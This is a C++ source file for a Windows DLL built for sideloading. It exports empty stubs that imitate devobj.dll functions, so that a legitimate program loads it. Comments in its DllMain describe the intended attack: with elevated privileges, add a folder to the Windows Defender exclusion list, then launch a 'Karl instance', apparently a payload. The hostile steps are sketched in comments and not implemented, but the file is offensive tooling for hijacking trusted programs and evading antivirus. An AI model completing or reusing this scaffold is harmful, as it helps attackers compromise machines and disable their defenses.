#include <Windows.h>

#define length(array) ((sizeof(array)) / (sizeof(array[0])))

BOOL APIENTRY DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
        // With elevated privileges, add folder to Defender exclude path
        // then execute Karl instance
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

// These functions enable the sideloading
extern "C" __declspec (dllexport) void DevObjCreateDeviceInfoList(){}

extern "C" __declspec (dllexport) void DevObjUninstallDevice(){}

extern "C" __declspec (dllexport) void DevObjOpenDevRegKey(){}

extern "C" __declspec (dllexport) void DevObjEnumDeviceInfo(){}

extern "C" __declspec (dllexport) void DevObjGetClassDevs() {}

extern "C" __declspec (dllexport) void DevObjGetDeviceInstanceId() {}

extern "C" __declspec (dllexport) void DevObjDestroyDeviceInfoList() {}